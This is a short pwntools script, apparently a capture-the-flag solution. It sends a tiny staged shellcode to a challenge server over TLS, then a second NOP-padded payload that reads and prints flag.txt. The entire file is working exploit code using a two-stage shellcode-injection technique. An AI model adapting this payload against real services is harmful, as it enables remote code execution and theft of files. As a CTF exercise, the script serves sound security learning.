from pwn import *

context.update(arch="amd64", os="linux")
warnings.simplefilter("ignore")

shellcode = asm(f"""
    dec edx
    lea rsi, [rip + a]
    syscall
    a:
""")

print(enhex(shellcode))
print(disasm(shellcode))

with remote(
    "9ea04557-b9fd-430a-9bc6-01a741eb5ed8.chall.dev.nnsc.tf", 41337, ssl=True
) as p:
    p.sendlineafter(b">> ", enhex(shellcode))
    p.sendline(asm(shellcraft.cat(b"flag.txt")).rjust(0x69, b"\x90"))
    success(p.recvline_contains(b"NNS"))
